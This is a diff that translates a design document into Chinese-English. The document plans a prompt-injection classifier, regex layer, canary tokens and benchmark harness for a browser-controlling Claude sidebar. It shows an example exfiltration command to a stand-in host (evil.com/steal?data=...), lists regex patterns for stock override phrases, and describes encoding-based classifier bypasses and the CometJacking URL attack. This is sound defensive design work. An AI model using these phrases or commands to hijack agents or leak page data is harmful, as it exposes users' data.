@@ -1,108 +1,94 @@
-# ML Prompt Injection Killer
+# ML Prompt Injection Killer（ML Prompt Injection 防护）
 
-**Status:** P0 TODO (follow-up to sidebar security fix PR)
-**Branch:** garrytan/extension-prompt-injection-defense
-**Date:** 2026-03-28
-**CEO Plan:** ~/.gstack/projects/garrytan-gstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md
+**Status（状态）：** P0 TODO（sidebar security fix PR 的 follow-up）
+**Branch（分支）：** garrytan/extension-prompt-injection-defense
+**Date（日期）：** 2026-03-28
+**CEO Plan（CEO 计划）：** ~/.gstack/projects/garrytan-gstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md
 
-## The Problem
+## 问题
 
-The gstack Chrome extension sidebar gives Claude bash access to control the browser.
-A prompt injection attack (via user message, page content, or crafted URL) can hijack
-Claude into executing arbitrary commands. PR 1 fixes this architecturally (command
-allowlist, XML framing, Opus default). This design doc covers the ML classifier layer
-that catches attacks the architecture can't see.
+gstack Chrome extension sidebar 给 Claude bash access 来控制浏览器。Prompt injection attack（通过 user message、page content 或 crafted URL）可以 hijack Claude，让它执行 arbitrary commands。PR 1 从 architecture 上修复这个问题（command allowlist、XML framing、Opus default）。本文档覆盖 ML classifier layer，用于抓住 architecture 看不到的 attacks。
 
-**What the command allowlist doesn't catch:** An attacker can still trick Claude into
-navigating to phishing sites, clicking malicious elements, or exfiltrating data visible
-on the current page via browse commands. The allowlist prevents `curl` and `rm`, but
-`$B goto https://evil.com/steal?data=...` is a valid browse command.
+**Command allowlist 抓不到什么：** attacker 仍然可以骗 Claude 导航到 phishing sites、点击 malicious elements，或通过 browse commands exfiltrate 当前页面上可见的数据。Allowlist 会阻止 `curl` 和 `rm`，但 `$B goto https://evil.com/steal?data=...` 是一个 valid browse command。
 
-## Industry State of the Art (March 2026)
+## Industry State of the Art（2026-03，行业现状）
 
-| System | Approach | Result | Source |
+| System（系统） | Approach（方法） | Result（结果） | Source（来源） |
 |--------|----------|--------|--------|
-| Claude Code Auto Mode | Two-layer: input probe scans tool outputs, transcript classifier (Sonnet 4.6, reasoning-blind) runs on every action | 0.4% FPR, 5.7% FNR | [Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode) |
-| Perplexity BrowseSafe | ML classifier (Qwen3-30B-A3B MoE) + input normalization + trust boundaries | F1 ~0.91, but Lasso Security bypassed 36% with encoding tricks | [Perplexity Research](https://research.perplexity.ai/articles/browsesafe), [Lasso](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks) |
-| Perplexity Comet | Defense-in-depth: ML classifiers + security reinforcement + user controls + notifications | CometJacking still worked via URL params | [Perplexity](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet), [LayerX](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/) |
-| Meta Rule of Two | Architectural: agent must satisfy max 2 of {untrusted input, sensitive access, state change} | Design pattern, not a tool | [Meta AI](https://ai.meta.com/blog/practical-ai-agent-security/) |
-| ProtectAI DeBERTa-v3 | Fine-tuned 86M param binary classifier for prompt injection | 94.8% accuracy, 99.6% recall, 90.9% precision | [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) |
-| tldrsec | Curated defense catalog: instructional, guardrails, firewalls, ensemble, canaries, architectural | "Prompt injection remains unsolved" | [GitHub](https://github.com/tldrsec/prompt-injection-defenses) |
-| Multi-Agent Defense | Pipeline of specialized agents for detection | 100% mitigation in lab conditions | [arXiv](https://arxiv.org/html/2509.14285v4) |
+| Claude Code Auto Mode | Two-layer：input probe 扫描 tool outputs；transcript classifier（Sonnet 4.6, reasoning-blind）在每次 action 上运行 | 0.4% FPR, 5.7% FNR | [Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode) |
+| Perplexity BrowseSafe | ML classifier（Qwen3-30B-A3B MoE）+ input normalization + trust boundaries | F1 ~0.91，但 Lasso Security 用 encoding tricks 绕过 36% | [Perplexity Research](https://research.perplexity.ai/articles/browsesafe), [Lasso](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks) |
+| Perplexity Comet | Defense-in-depth：ML classifiers + security reinforcement + user controls + notifications | CometJacking 仍可通过 URL params 生效 | [Perplexity](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet), [LayerX](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/) |
+| Meta Rule of Two | Architectural：agent 最多只能同时满足 {untrusted input, sensitive access, state change} 中 2 项 | Design pattern，不是 tool | [Meta AI](https://ai.meta.com/blog/practical-ai-agent-security/) |
+| ProtectAI DeBERTa-v3 | 面向 prompt injection fine-tuned 的 86M param binary classifier | 94.8% accuracy, 99.6% recall, 90.9% precision | [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) |
+| tldrsec | Curated defense catalog：instructional、guardrails、firewalls、ensemble、canaries、architectural | "Prompt injection remains unsolved" | [GitHub](https://github.com/tldrsec/prompt-injection-defenses) |
+| Multi-Agent Defense | Specialized agents 的 detection pipeline | Lab conditions 下 100% mitigation | [arXiv](https://arxiv.org/html/2509.14285v4) |
 
-**Key insights:**
-- Claude Code auto mode's transcript classifier is **reasoning-blind** by design. It
-  sees user messages + tool calls but strips Claude's own reasoning, preventing
-  self-persuasion attacks.
-- Perplexity concluded: "LLM-based guardrails cannot be the final line of defense.
-  Need at least one deterministic enforcement layer."
-- BrowseSafe was bypassed 36% of the time with **simple encoding techniques** (base64,
-  URL encoding). Single-model defense is insufficient.
-- CometJacking required zero credentials or user interaction. One crafted URL stole
-  emails and calendar data.
-- The academic consensus (NDSS 2026, multiple papers): prompt injection remains
-  unsolved. Design systems with this in mind, don't assume any filter is reliable.
+**Key insights（关键洞察）：**
+- Claude Code auto mode 的 transcript classifier 设计上是 **reasoning-blind**。它看到 user messages + tool calls，但剥离 Claude 自己的 reasoning，防止 self-persuasion attacks。
+- Perplexity 的结论是："LLM-based guardrails cannot be the final line of defense. Need at least one deterministic enforcement layer."
+- BrowseSafe 36% 的时间被 **simple encoding techniques**（base64、URL encoding）绕过。Single-model defense 不够。
+- CometJacking 不需要 credentials 或 user interaction。一个 crafted URL 就能偷走 emails 和 calendar data。
+- Academic consensus（NDSS 2026，多篇 papers）：prompt injection remains unsolved。设计系统时要把这一点当作前提，不要假设任何 filter 可靠。
 
-## Open Source Tools Landscape
+## Open Source Tools Landscape（开源工具格局）
 
-### Usable Now
+### Usable Now（现在可用）
 
 **1. ProtectAI DeBERTa-v3-base-prompt-injection-v2**
 - [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
-- 86M param binary classifier (injection / no injection)
-- 94.8% accuracy, 99.6% recall, 90.9% precision
-- Has [ONNX variant](https://huggingface.co/protectai/deberta-v3-base-injection-onnx) for fast inference (~5ms native, ~50-100ms WASM)
-- Limitation: doesn't detect jailbreaks, English-only, false positives on system prompts
-- **Our pick for v1.** Small, fast, well-tested, maintained by a security team.
+- 86M param binary classifier（injection / no injection）
+- 94.8% accuracy、99.6% recall、90.9% precision
+- 有 [ONNX variant](https://huggingface.co/protectai/deberta-v3-base-injection-onnx)，用于 fast inference（~5ms native，~50-100ms WASM）
+- Limitation：不检测 jailbreaks、仅 English、system prompts 上有 false positives
+- **我们 v1 的选择。** 小、快、tested 良好，由 security team 维护。
 
 **2. Perplexity BrowseSafe**
 - [HuggingFace model](https://huggingface.co/perplexity-ai/browsesafe) + [benchmark dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
-- Qwen3-30B-A3B (MoE), fine-tuned for browser agent injection
-- F1 ~0.91 on BrowseSafe-Bench (3,680 test samples, 11 attack types, 9 injection strategies)
-- **Model too large for local inference** (30B params). But the benchmark dataset is
-  gold for testing our own defenses.
+- Qwen3-30B-A3B（MoE），为 browser agent injection fine-tuned
+- BrowseSafe-Bench 上 F1 ~0.91（3,680 test samples、11 attack types、9 injection strategies）
+- **Model too large for local inference**（30B params）。但 benchmark dataset 是测试我们 defenses 的 gold。
 
 **3. @huggingface/transformers v4**
 - [npm](https://www.npmjs.com/package/@huggingface/transformers)
-- JavaScript ML inference library. Native Bun support (shipped Feb 2026).
-- WASM backend works in compiled binaries. WebGPU backend for acceleration.
-- Loads DeBERTa ONNX models directly. ~50-100ms inference with WASM.
-- **This is the integration path for the DeBERTa model.**
+- JavaScript ML inference library。Native Bun support（2026-02 shipped）。
+- WASM backend 可在 compiled binaries 中工作。WebGPU backend 用于 acceleration。
+- 直接加载 DeBERTa ONNX models。WASM inference ~50-100ms。
+- **这是 DeBERTa model 的 integration path。**
 
-**4. theRizwan/llm-guard (TypeScript)**
+**4. theRizwan/llm-guard（TypeScript）**
 - [GitHub](https://github.com/theRizwan/llm-guard)
-- TypeScript/JS library for prompt injection, PII, jailbreak, profanity detection
-- Small project, unclear maintenance. Needs audit before depending on it.
+- Prompt injection、PII、jailbreak、profanity detection 的 TypeScript/JS library
+- 小项目，maintenance 不明确。依赖前需要 audit。
 
 **5. ProtectAI Rebuff**
 - [GitHub](https://github.com/protectai/rebuff)
-- Multi-layer: heuristics + LLM classifier + vector DB of known attacks + canary tokens
-- Python-based. Architecture pattern is reusable, library is not.
+- Multi-layer：heuristics + LLM classifier + known attacks vector DB + canary tokens
+- Python-based。架构 pattern 可复用，library 不复用。
 
-**6. ProtectAI LLM Guard (Python)**
+**6. ProtectAI LLM Guard（Python）**
 - [GitHub](https://github.com/protectai/llm-guard)
-- 15 input scanners, 20 output scanners. Mature, well-maintained.
-- Python-only. Would need sidecar process or reimplementation.
+- 15 input scanners、20 output scanners。Mature、well-maintained。
+- Python-only。需要 sidecar process 或 reimplementation。
 
 **7. @openai/guardrails**
 - [npm](https://www.npmjs.com/package/@openai/guardrails)
-- OpenAI's TypeScript guardrails. LLM-based injection detection.
-- Requires OpenAI API calls (adds latency, cost, vendor dependency). Not ideal.
+- OpenAI 的 TypeScript guardrails。LLM-based injection detection。
+- 需要 OpenAI API calls（增加 latency、cost、vendor dependency）。不理想。
 
-### Benchmark Dataset
+### Benchmark Dataset（基准数据集）
 
-**BrowseSafe-Bench** — 3,680 adversarial test cases from Perplexity:
-- 11 attack types with different security criticality levels
+**BrowseSafe-Bench** — 来自 Perplexity 的 3,680 adversarial test cases：
+- 11 attack types，带不同 security criticality levels
 - 9 injection strategies
 - 5 distractor types
 - 5 context-aware generation types
-- 5 domains, 3 linguistic styles, 5 evaluation metrics
+- 5 domains、3 linguistic styles、5 evaluation metrics
 - [Dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
-- Use this to validate our detection rate. Target: >95% detection, <1% false positive.
+- 用它验证我们的 detection rate。Target：>95% detection，<1% false positive。
 
-## Architecture
+## 架构
 
-### Reusable Security Module: `browse/src/security.ts`
+### Reusable Security Module（可复用安全模块）：`browse/src/security.ts`
 
 ```typescript
 // Public API -- any gstack component can call these
@@ -125,21 +111,21 @@ type SecurityResult = {
 type SecurityStatus = 'protected' | 'degraded' | 'inactive'
 ```
 
-### Defense Layers (full vision)
+### Defense Layers（full vision）
 
-| Layer | What | How | Status |
+| Layer（层） | What（内容） | How（方式） | Status（状态） |
 |-------|------|-----|--------|
-| L0 | Model selection | Default to Opus | PR 1 (done) |
-| L1 | XML prompt framing | `<system>` + `<user-message>` with escaping | PR 1 (done) |
+| L0 | Model selection | 默认 Opus | PR 1 (done) |
+| L1 | XML prompt framing | `<system>` + `<user-message>`，带 escaping | PR 1 (done) |
 | L2 | DeBERTa classifier | @huggingface/transformers v4 WASM, 94.8% accuracy | **THIS PR** |
-| L2b | Regex patterns | Decode base64/URL/HTML entities, then pattern match | **THIS PR** |
-| L3 | Page content scan | Pre-scan snapshot before prompt construction | **THIS PR** |
-| L4 | Bash command allowlist | Browse-only commands pass | PR 1 (done) |
-| L5 | Canary tokens | Random token per session, check output stream | **THIS PR** |
-| L6 | Transparent blocking | Show user what was caught and why | **THIS PR** |
-| L7 | Shield icon | Security status indicator (green/yellow/red) | **THIS PR** |
+| L2b | Regex patterns | Decode base64/URL/HTML entities 后再 pattern match | **THIS PR** |
+| L3 | Page content scan | Prompt construction 前 pre-scan snapshot | **THIS PR** |
+| L4 | Bash command allowlist | 只允许 Browse-only commands pass | PR 1 (done) |
+| L5 | Canary tokens | 每个 session 一个 random token，检查 output stream | **THIS PR** |
+| L6 | Transparent blocking | 展示抓到了什么以及原因 | **THIS PR** |
+| L7 | Shield icon | Security status indicator（green/yellow/red） | **THIS PR** |
 
-### Data Flow with ML Classifier
+### Data Flow with ML Classifier（带 ML classifier 的数据流）
 
 ```
   USER INPUT
@@ -149,17 +135,17 @@ type SecurityStatus = 'protected' | 'degraded' | 'inactive'
     |
     |  1. checkInjection(userMessage)
     |     -> DeBERTa WASM (~50-100ms)
-    |     -> Regex patterns (decode encodings first)
+    |     -> Regex patterns（先 decode encodings）
     |     -> Returns: SAFE | WARN | BLOCK
     |
     |  2. scanPageContent(currentPageSnapshot)
-    |     -> Same classifier on page content
-    |     -> Catches indirect injection (hidden text in pages)
+    |     -> 在 page content 上运行同一个 classifier
+    |     -> 捕捉 indirect injection（pages 中的 hidden text）
     |
-    |  3. injectCanary(prompt) -> adds secret token
+    |  3. injectCanary(prompt) -> 添加 secret token
     |
-    |  4. If WARN: inject warning into system prompt
-    |     If BLOCK: show blocking message, don't spawn Claude
+    |  4. If WARN：向 system prompt 注入 warning
+    |     If BLOCK：显示 blocking message，不 spawn Claude
     |
     v
   QUEUE FILE -> SIDEBAR AGENT -> CLAUDE SUBPROCESS
@@ -167,43 +153,42 @@ type SecurityStatus = 'protected' | 'degraded' | 'inactive'
                                     v (output stream)
                                   checkCanary(output)
                                     |
-                                    v (if leaked)
+                                    v（如果 leaked）
                                   KILL SESSION + WARN USER
 ```
 
-### Graceful Degradation
+### Graceful Degradation（优雅降级）
 
-The security module NEVER blocks the sidebar from working:
-
-```
-Model downloaded + loaded  -> Full ML + regex + canary (shield: green)
-Model not downloaded       -> Regex only (shield: yellow, "Downloading...")
-WASM runtime fails         -> Regex only (shield: yellow)
-Model corrupted            -> Re-download next startup (shield: yellow)
-Security module crashes    -> No check, fall through (shield: red)
-```
-
-## Encoding Evasion Defense
-
-Attackers bypass classifiers using encoding tricks (this is how Lasso bypassed
-BrowseSafe 36% of the time). Our defense: **decode before checking.**
+Security module 永远不会阻止 sidebar 工作：
 
 ```
-Input normalization pipeline (in security.ts):
+Model downloaded + loaded  -> Full ML + regex + canary（shield: green）
+Model not downloaded       -> Regex only（shield: yellow, "Downloading..."）
+WASM runtime fails         -> Regex only（shield: yellow）
+Model corrupted            -> next startup 重新下载（shield: yellow）
+Security module crashes    -> 不检查，fall through（shield: red）
+```
+
+## Encoding Evasion Defense（编码绕过防御）
+
+Attackers 会用 encoding tricks 绕过 classifiers（Lasso 就是这样 36% 绕过 BrowseSafe）。我们的 defense：**decode before checking。**
+
+```
+Input normalization pipeline（在 security.ts 中）：
   1. Detect and decode base64 segments
   2. Decode URL-encoded sequences (%XX)
-  3. Decode HTML entities (&amp; etc.)
-  4. Flatten Unicode homoglyphs (Cyrillic а -> Latin a)
+  3. Decode HTML entities (&amp; 等)
+  4. Flatten Unicode homoglyphs（Cyrillic а -> Latin a）
   5. Strip zero-width characters
-  6. Run classifier on DECODED input
+  6. 在 DECODED input 上运行 classifier
 ```
 
-This is deterministic. No encoding trick survives full normalization.
+这是 deterministic。完整 normalization 后，没有 encoding trick 能存活。
 
-## Regex Patterns (deterministic layer)
+## Regex Patterns（deterministic layer）
 
 ```
-Known injection patterns (case-insensitive):
+Known injection patterns（case-insensitive）：
   - ignore (all |the )?(previous|above|prior) (instructions|rules|prompt)
   - (system|admin|root) (override|prompt|instruction)
   - you are now|new instructions:|forget (everything|your|all)
@@ -211,10 +196,9 @@ Known injection patterns (case-insensitive):
   - </?(system|user-message|instructions?)>  (XML tag injection)
 ```
 
-Action: WARN (not block). Inject `[PROMPT INJECTION WARNING]` marker into prompt.
-Blocking creates false positives. Warning + smart model beats hard blocking.
+Action：WARN（不是 block）。向 prompt 注入 `[PROMPT INJECTION WARNING]` marker。Blocking 会制造 false positives。Warning + smart model 比 hard blocking 更好。
 
-## Canary Tokens
+## Canary Tokens（Canary tokens）
 
 ```
 In system prompt:
@@ -228,12 +212,11 @@ In output stream checker:
   -> Log attempt
 ```
 
-Detection rate: catches naive exfiltration attempts that try to leak the system prompt.
-Sophisticated attacks avoid this, which is why it's one layer among seven.
+Detection rate：能抓住 naive exfiltration attempts，也就是试图 leak system prompt 的攻击。Sophisticated attacks 会避开它，所以它只是七层中的一层。
 
-## Attack Logging + Special Telemetry
+## Attack Logging + Special Telemetry（攻击日志与特殊 telemetry）
 
-### Local Logging (always on)
+### Local Logging（always on）
 
 ```json
 // ~/.gstack/security/attempts.jsonl
@@ -247,89 +230,79 @@ Sophisticated attacks avoid this, which is why it's one layer among seven.
 }
 ```
 
-Privacy: payload HASH with random salt (not raw payload). URL domain only. No full paths.
+Privacy：payload HASH with random salt（不是 raw payload）。只记录 URL domain。无 full paths。
 
-### Special Telemetry (ask even when telemetry is off)
+### Special Telemetry（telemetry off 时也询问）
 
-Prompt injection detections in the wild are rare and scientifically valuable. When a
-detection occurs, even if the user has telemetry set to "off":
+真实世界中的 prompt injection detections 很罕见，也很有科学价值。当 detection 发生时，即使用户把 telemetry 设置为 "off"：
 
 ```
 AskUserQuestion:
-  "gstack just blocked a prompt injection attempt from {domain}. These detections
-   are rare and valuable for improving defenses for all gstack users. Can we
-   anonymously report this detection? (payload hash + confidence score only,
-   no URL, no personal data)"
+  "gstack 刚刚拦截了来自 {domain} 的 prompt injection attempt。这类 detections
+   很罕见，对改进所有 gstack 用户的防御很有价值。可以匿名上报这次 detection 吗？
+   （只包含 payload hash + confidence score；不包含 URL，不包含 personal data）"
 
-  A) Yes, report this one
-  B) No thanks
+  A) 是，上报这一次
+  B) 不用了，谢谢
 ```
 
-This respects user sovereignty while collecting high-signal security events.
+这样既尊重 user sovereignty，又能收集 high-signal security events。
 
-Note: The AskUserQuestion happens through the Claude subprocess (which has access to
-AskUserQuestion), not through the extension UI (which doesn't have an ask-user primitive).
+Note：AskUserQuestion 通过 Claude subprocess 发生（它能访问 AskUserQuestion），不是通过 extension UI（没有 ask-user primitive）。
 
-## Shield Icon UI
+## Shield Icon UI（盾牌图标 UI）
 
-Add to sidebar header:
-- Green shield: all defense layers active (model loaded, allowlist active)
-- Yellow shield: degraded (model not loaded, regex-only)
-- Red shield: inactive (security module error)
+添加到 sidebar header：
+- Green shield：all defense layers active（model loaded、allowlist active）
+- Yellow shield：degraded（model not loaded、regex-only）
+- Red shield：inactive（security module error）
 
-Implementation: add security state to existing `/health` endpoint (don't create a
-new `/security-status` endpoint). Sidepanel polls `/health` and reads the security field.
+Implementation：把 security state 添加到现有 `/health` endpoint（不要创建新的 `/security-status` endpoint）。Sidepanel poll `/health` 并读取 security field。
 
-## BrowseSafe-Bench Red Team Harness
+## BrowseSafe-Bench Red Team Harness（红队测试 harness）
 
 ### `browse/test/security-bench.test.ts`
 
 ```
-1. Download BrowseSafe-Bench dataset (3,680 cases) on first run
-2. Cache to ~/.gstack/models/browsesafe-bench/ (not re-downloaded in CI)
-3. Run every case through checkInjection()
-4. Report:
-   - Detection rate per attack type (11 types)
+1. 首次运行时下载 BrowseSafe-Bench dataset（3,680 cases）
+2. 缓存到 ~/.gstack/models/browsesafe-bench/（CI 中不重复下载）
+3. 让每个 case 都通过 checkInjection()
+4. 报告：
+   - 每种 attack type 的 detection rate（11 types）
    - False positive rate
-   - Bypass rate per injection strategy (9 strategies)
+   - 每种 injection strategy 的 bypass rate（9 strategies）
    - Latency p50/p95/p99
-5. Fail if detection rate < 90% or false positive rate > 5%
+5. 如果 detection rate < 90% 或 false positive rate > 5%，则 fail
 ```
 
-This is also the `/security-test` command users can run anytime.
+这也是用户可随时运行的 `/security-test` command。
 
-## The Ambitious Vision: Bun-Native DeBERTa (~5ms)
+## Ambitious Vision：Bun-Native DeBERTa（~5ms）
 
-### Why WASM is a stepping stone
+### 为什么 WASM 是 stepping stone
 
-The @huggingface/transformers WASM backend gives us ~50-100ms inference. That's fine
-for sidebar input (human typing speed). But for scanning every page snapshot, every
-tool output, every browse command response... 100ms per check adds up.
+@huggingface/transformers WASM backend 给我们 ~50-100ms inference。对 sidebar input（human typing speed）来说够用。但如果要扫描每个 page snapshot、每个 tool output、每个 browse command response，100ms per check 会不断累积。
 
-Claude Code auto mode's input probe runs server-side on Anthropic's infrastructure.
-They can afford fast native inference. We're running on the user's Mac.
+Claude Code auto mode 的 input probe 在 Anthropic infrastructure 上 server-side 运行。它们负担得起 fast native inference。我们运行在用户的 Mac 上。
 
-### The 5ms path: port DeBERTa tokenizer + inference to Bun-native
+### 5ms path：把 DeBERTa tokenizer + inference port 到 Bun-native
 
-**Layer 1 approach:** Use onnxruntime-node (native N-API bindings). ~5ms inference.
-Problem: doesn't work in compiled Bun binaries (native module loading fails).
+**Layer 1 approach：** 使用 onnxruntime-node（native N-API bindings）。~5ms inference。问题：在 compiled Bun binaries 中不能工作（native module loading fails）。
 
-**Layer 3 / EUREKA approach:** Port the DeBERTa tokenizer and ONNX inference to pure
-Bun/TypeScript using Bun's native SIMD and typed array support. No WASM, no native
-modules, no onnxruntime dependency.
+**Layer 3 / EUREKA approach：** 使用 Bun 的 native SIMD 和 typed array support，把 DeBERTa tokenizer 和 ONNX inference port 到 pure Bun/TypeScript。无 WASM、无 native modules、无 onnxruntime dependency。
 
 ```
 Components to port:
   1. DeBERTa tokenizer (SentencePiece-based)
      - Vocabulary: ~128k tokens, load from JSON
-     - Tokenization: BPE with SentencePiece, pure TypeScript
-     - Already done by HuggingFace tokenizers.js, but we can optimize
+     - Tokenization：BPE with SentencePiece，pure TypeScript
+     - HuggingFace tokenizers.js 已经做过，但我们可以 optimize
 
   2. ONNX model inference
      - DeBERTa-v3-base has 12 transformer layers, 86M params
      - Weights: ~350MB float32, ~170MB float16
      - Forward pass: embedding -> 12x (attention + FFN) -> pooler -> classifier
-     - All operations are matrix multiplies + activations
+     - 所有 operations 都是 matrix multiplies + activations
      - Bun has Float32Array, SIMD support, and fast TypedArray ops
 
   3. The critical path for classification:
@@ -340,39 +313,36 @@ Components to port:
      - Total: ~4-5ms
 
   4. Optimization opportunities:
-     - Float16 quantization (halves memory, faster on ARM)
-     - KV cache for repeated prefixes
-     - Batch tokenization for page content
-     - Skip layers for high-confidence early exits
-     - Bun's FFI for BLAS matmul (Apple Accelerate on macOS)
+     - Float16 quantization（内存减半，ARM 上更快）
+     - repeated prefixes 的 KV cache
+     - page content 的 batch tokenization
+     - high-confidence early exits 时跳过 layers
+     - 用于 BLAS matmul 的 Bun FFI（macOS 上使用 Apple Accelerate）
 ```
 
-**Effort:** XL (human: ~2 months / CC: ~1-2 weeks)
+**Effort（投入）：** XL（human: ~2 months / CC: ~1-2 weeks）
 
-**Why this might be worth it:**
-- 5ms inference means we can scan EVERYTHING: every message, every page, every tool
-  output, every browse command response. No latency tradeoffs.
-- Zero external dependencies. Pure TypeScript. Works everywhere Bun works.
-- gstack becomes the only open source tool with native-speed prompt injection detection.
-- The tokenizer + inference engine could be published as a standalone package.
+**为什么这可能值得：**
+- 5ms inference 意味着我们可以 scan EVERYTHING：每条 message、每个 page、每个 tool output、每个 browse command response。无 latency tradeoffs。
+- 零 external dependencies。Pure TypeScript。Bun 能跑的地方都能工作。
+- gstack 会成为唯一拥有 native-speed prompt injection detection 的 open source tool。
+- Tokenizer + inference engine 可以作为 standalone package 发布。
 
-**Why it might not:**
-- WASM at 50-100ms is probably good enough for the sidebar use case.
-- Maintaining a custom inference engine is a lot of ongoing work.
-- @huggingface/transformers will keep getting faster (WebGPU support is already landing).
-- The 5ms target matters more if we're scanning every tool output, which we're not doing yet.
+**为什么可能不值得：**
+- WASM 的 50-100ms 对 sidebar use case 可能已经足够。
+- 维护 custom inference engine 需要大量 ongoing work。
+- @huggingface/transformers 会持续变快（WebGPU support 已经在 landing）。
+- 5ms target 在我们扫描每个 tool output 时才更重要，而我们还没这样做。
 
-**Recommended path:**
-1. Ship WASM version (this PR)
+**推荐路径：**
+1. Ship WASM version（this PR）
 2. Benchmark real-world latency
-3. If latency is a bottleneck, explore Bun FFI + Apple Accelerate for matmul
-4. If that's still not enough, consider the full native port
+3. 如果 latency 成为 bottleneck，探索 Bun FFI + Apple Accelerate for matmul
+4. 如果仍不够，再考虑 full native port
 
-### Alternative: Bun FFI + Apple Accelerate (medium effort)
+### Alternative：Bun FFI + Apple Accelerate（medium effort）
 
-Instead of porting all of ONNX, use Bun's FFI to call Apple's Accelerate framework
-(vDSP, BLAS) for the matrix multiplies. Keep the tokenizer in TypeScript, keep the
-model weights in Float32Array, but call native BLAS for the heavy math.
+不 port 全部 ONNX，而是使用 Bun 的 FFI 调 Apple Accelerate framework（vDSP、BLAS）做 matrix multiplies。Tokenizer 保留在 TypeScript 中，model weights 保留在 Float32Array 中，但 heavy math 调 native BLAS。
 
 ```typescript
 import { dlopen, FFIType } from "bun:ffi";
@@ -385,57 +355,47 @@ const accelerate = dlopen("/System/Library/Frameworks/Accelerate.framework/Accel
 accelerate.symbols.cblas_sgemm(...);
 ```
 
-**Effort:** L (human: ~2 weeks / CC: ~4-6 hours)
-**Result:** ~5-10ms inference on Apple Silicon, pure Bun, no npm dependencies.
-**Limitation:** macOS-only (Linux would need OpenBLAS FFI). But gstack already
-ships macOS-only compiled binaries.
+**Effort（投入）：** L（human: ~2 weeks / CC: ~4-6 hours）
+**Result（结果）：** Apple Silicon 上 ~5-10ms inference，pure Bun，无 npm dependencies。
+**Limitation（限制）：** macOS-only（Linux 需要 OpenBLAS FFI）。但 gstack 已经 ships macOS-only compiled binaries。
 
-## Codex Review Findings (from the eng review)
+## Codex 评审发现（from the eng review）
 
-Codex (GPT-5.4) reviewed this plan and found 15 issues. The critical ones that
-apply to this ML classifier PR:
+Codex（GPT-5.4）review 了这个 plan，发现 15 issues。适用于这个 ML classifier PR 的 critical ones：
 
-1. **Page scan aimed at wrong ingress** — pre-scanning once before prompt construction
-   doesn't cover mid-session content from `$B snapshot`. Consider: also scan tool
-   outputs in the sidebar agent's stream handler, or accept this as a known limitation.
+1. **Page scan aimed at wrong ingress** — prompt construction 前只 pre-scan 一次，覆盖不到 `$B snapshot` 带来的 mid-session content。Consider：也扫描 sidebar agent stream handler 中的 tool outputs，或接受这是 known limitation。
 
-2. **Fail-open design** — if the ML classifier crashes, the system reverts to the
-   (already-fixed) architectural controls only. This is intentional: ML is
-   defense-in-depth, not a gate. But document it clearly.
+2. **Fail-open design** — 如果 ML classifier crash，系统退回到（已经修复的）architectural controls only。这是有意设计：ML 是 defense-in-depth，不是 gate。但要清楚 document。
 
-3. **Benchmark non-hermetic** — BrowseSafe-Bench downloads at runtime. Cache the
-   dataset locally so CI doesn't depend on HuggingFace availability.
+3. **Benchmark non-hermetic** — BrowseSafe-Bench 在 runtime 下载。把 dataset cache 到本地，避免 CI 依赖 HuggingFace availability。
 
-4. **Payload hash privacy** — add random salt per session to prevent rainbow table
-   attacks on short/common payloads.
+4. **Payload hash privacy** — 每个 session 添加 random salt，防止对 short/common payloads 做 rainbow table attacks。
 
-5. **Read/Glob/Grep tool output injection** — even with Bash restricted, untrusted
-   repo content read via Read/Glob/Grep enters Claude's context. This is a known
-   gap. Out of scope for this PR but should be tracked.
+5. **Read/Glob/Grep tool output injection** — 即使 Bash 受限，通过 Read/Glob/Grep 读取的 untrusted repo content 也会进入 Claude context。这是 known gap。本 PR out of scope，但应 tracking。
 
-## Implementation Checklist
+## Implementation Checklist（实现清单）
 
-- [ ] Add `@huggingface/transformers` to package.json
-- [ ] Create `browse/src/security.ts` with full public API
-- [ ] Implement `loadModel()` with download-on-first-use to ~/.gstack/models/
-- [ ] Implement `checkInjection()` with DeBERTa + regex + encoding normalization
-- [ ] Implement `scanPageContent()` (same classifier, different input)
-- [ ] Implement `injectCanary()` + `checkCanary()`
-- [ ] Implement `logAttempt()` with salted hashing
-- [ ] Implement `getStatus()` for shield icon
-- [ ] Integrate into server.ts `spawnClaude()`
-- [ ] Add canary checking to sidebar-agent.ts output stream
-- [ ] Add shield icon to sidepanel.js
-- [ ] Add blocking message UI to sidepanel.js
-- [ ] Add security state to /health endpoint
-- [ ] Implement special telemetry (AskUserQuestion on detection)
-- [ ] Create browse/test/security.test.ts (unit + adversarial)
-- [ ] Create browse/test/security-bench.test.ts (BrowseSafe-Bench harness)
-- [ ] Cache BrowseSafe-Bench dataset for offline CI
-- [ ] Add `test:security-bench` script to package.json
-- [ ] Update CLAUDE.md with security module documentation
+- [ ] 把 `@huggingface/transformers` 加到 package.json
+- [ ] 创建带 full public API 的 `browse/src/security.ts`
+- [ ] 实现 `loadModel()`，download-on-first-use 到 ~/.gstack/models/
+- [ ] 实现 `checkInjection()`，包含 DeBERTa + regex + encoding normalization
+- [ ] 实现 `scanPageContent()`（same classifier，different input）
+- [ ] 实现 `injectCanary()` + `checkCanary()`
+- [ ] 实现带 salted hashing 的 `logAttempt()`
+- [ ] 为 shield icon 实现 `getStatus()`
+- [ ] 集成到 server.ts `spawnClaude()`
+- [ ] 在 sidebar-agent.ts output stream 中添加 canary checking
+- [ ] 给 sidepanel.js 添加 shield icon
+- [ ] 给 sidepanel.js 添加 blocking message UI
+- [ ] 给 /health endpoint 添加 security state
+- [ ] 实现 special telemetry（detection 时 AskUserQuestion）
+- [ ] 创建 browse/test/security.test.ts（unit + adversarial）
+- [ ] 创建 browse/test/security-bench.test.ts（BrowseSafe-Bench harness）
